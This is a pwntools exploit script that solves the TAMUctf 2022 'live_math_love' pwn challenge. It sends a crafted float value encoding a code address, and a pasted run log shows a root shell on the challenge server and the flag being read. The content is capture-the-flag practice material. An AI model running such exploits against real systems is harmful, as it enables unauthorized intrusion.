from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './live_math_love'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  s = remote("tamuctf.com", 443, ssl=True, sni="live-math-love")
else:
  s = process(BINARY)
  
s.sendlineafter("> ", "1")
s.sendline("0")
s.sendline("5.883707532277683e-39") # struct.unpack('!f', '\x00\x40\x11\x62')[0]
s.sendline("0")
s.sendlineafter("> ", "1")

s.interactive()

'''
mito@ubuntu:~/CTF/TAMUctf_2022/Pwn_LIVE_MATH_LOVE$ python3 solve.py r
[*] '/home/mito/CTF/TAMUctf_2022/Pwn_LIVE_MATH_LOVE/live_math_love'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to tamuctf.com on port 443: Done
solve.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  s.sendlineafter("> ", "1")
/home/mito/.local/lib/python3.8/site-packages/pwnlib/tubes/tube.py:822: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
solve.py:15: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  s.sendline("0")
solve.py:16: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  s.sendline("5.883707532277683e-39") # struct.unpack('!f', '\x00\x40\x11\x62')[0]
solve.py:17: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  s.sendline("0")
solve.py:18: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  s.sendlineafter("> ", "1")
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) groups=0(root)
$ ls -l
total 28
-rw-r--r-- 1 root root    77 Apr 13 04:56 docker_entrypoint.sh
-rw-r--r-- 1 root root    20 Apr  9 22:54 flag.txt
-rwxr-xr-x 1 root root 16904 Apr 13 04:55 live_math_love
$ cat flag.txt
gigem{m47h3m461c4l!}
'''
